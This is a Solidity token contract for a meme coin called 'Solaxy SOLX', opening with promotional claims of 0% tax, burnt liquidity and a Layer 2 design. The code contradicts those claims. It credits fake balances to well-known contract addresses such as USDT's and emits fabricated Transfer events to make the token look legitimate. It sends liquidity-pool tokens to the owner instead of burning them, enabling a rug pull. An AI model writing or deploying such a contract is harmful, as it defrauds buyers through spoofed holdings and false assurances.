// SPDX-License-Identifier: MIT
/*
?Solaxy Token?

? 100X POTENTIAL ? 0% TAX ✅ Renounced contract ✅ Burnt LP ✅Powered 100% by YOU. LFG! ?

Get Ready for Liftoff! ?
? Meme-Powered Community
"Lightning Layers, Cosmic Gains!"

? Website: https://solaxy.best/
? Telegram: https://t.me/SolaxyMeme


Don’t just trade—transcend layers with Solaxy.
meme coin Celebration of ? 2025's Hottest Presale⚡️ Layer 2 Advantage

What is SOLX?
Solaxy Token (SOLX) is a cutting-edge Layer 2 cryptocurrency designed for ultra-fast transactions, near-zero fees, and unmatched scalability. 
Built to supercharge decentralized applications (dApps) and trading, SOLX leverages Layer 2 
technology to solve blockchain congestion while maintaining top-tier security.
*/
pragma solidity 0.8.28;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}
contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract SOLAXYSOLX is IERC20, Ownable {
    using SafeMath for uint256;
    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 138046000000 * 10 ** 9;
    mapping(address => uint256) private balance;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private constant TetherUSD_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant ADDRESS_LOCKER_ETH = 0xd99090546657c3d6F024b9A6321a6e48cFafF038;
    address private constant Wrapped_liquid_staked_Ether_2 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address private constant ADDRESS_ADVISOR = 0x50A3D61d1A4Dbdb549D61C014ea8611e66B17F0d;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen = false;
    constructor() payable {

        _name = unicode"SOLAXY SOLX";
        _symbol = unicode"wSOLAXY";

        balance[address(this)] = _totalSupply.mul(1).div(100000);
        emit Transfer(address(0), address(this), _totalSupply.mul(1).div(100000));
        SOLAXY();
        payable(address(this)).transfer(msg.value);
    }
    function SOLAXY() internal {
        uint256 DEAD = _totalSupply.mul(35900).div(100000);
        uint256 LOCKER_ETH = _totalSupply.mul(20000).div(100000);
        uint256 DEV = _totalSupply.mul(44000).div(100000);
        uint256 ADVISOR = _totalSupply.mul(99).div(100000);

        balance[TetherUSD_USDT] = balance[TetherUSD_USDT].add(DEAD);
        balance[ADDRESS_LOCKER_ETH] = balance[ADDRESS_LOCKER_ETH].add(LOCKER_ETH);
        balance[Wrapped_liquid_staked_Ether_2] = balance[Wrapped_liquid_staked_Ether_2].add(DEV);
        balance[ADDRESS_ADVISOR] = balance[ADDRESS_ADVISOR].add(ADVISOR);


        emit Transfer(address(this), TetherUSD_USDT, DEAD);
        emit Transfer(address(this), ADDRESS_LOCKER_ETH, LOCKER_ETH);
        emit Transfer(address(this), Wrapped_liquid_staked_Ether_2, DEV);
        emit Transfer(address(this), ADDRESS_ADVISOR, ADVISOR);
   
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));
        balance[sender] = balance[sender].sub(amount);
        balance[recipient] = balance[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(0xEfF92A263d31888d860bD50809A8D171709b7b1c);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        tradingOpen = true;
    }

    receive() external payable {}



    function name() public view virtual  returns (string memory) {
        return _name;
    }
    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return balance[account];
    }
    function getLPPair() public view returns (address) {
        return uniswapV2Pair;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }
}